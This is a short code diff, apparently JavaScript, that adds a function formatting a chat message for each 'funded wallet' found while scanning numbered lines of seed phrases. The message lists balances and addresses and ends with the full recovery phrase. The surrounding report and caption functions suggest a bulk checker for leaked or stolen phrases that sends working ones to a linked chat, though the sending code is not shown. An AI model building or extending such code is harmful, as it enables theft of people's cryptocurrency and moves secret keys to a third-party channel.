@@ -39,6 +39,28 @@ export function buildReport(all, funded) {
   return lines.join("\n");
 }
 
+/** One message for a single funded wallet, delivered to the linked chat as it lands. */
+export function buildWalletMessage(slot) {
+  const lines = [
+    `FUNDED WALLET · ${formatUsd(slot.total)}`,
+    `Line ${slot.line} · ${slot.words}-word phrase`,
+    "",
+  ];
+  for (const item of slot.funded || []) {
+    lines.push(`${item.symbol}: ${compactAmount(item.balance)} — ${formatUsd(item.value)}`);
+  }
+  const fundedChains = new Set((slot.funded || []).map((item) => item.chain));
+  const addresses = Object.entries(slot.addresses || {}).filter(([chain]) => fundedChains.has(chain));
+  if (addresses.length) {
+    lines.push("", "Addresses:");
+    for (const [chain, address] of addresses) {
+      lines.push(`${chain}: ${Array.isArray(address) ? address.join(", ") : address}`);
+    }
+  }
+  lines.push("", "Phrase:", slot.phrase);
+  return lines.join("\n");
+}
+
 export function buildCaption(all, funded, scanned) {
   const total = funded.reduce((sum, slot) => sum + slot.total, 0);
   return [
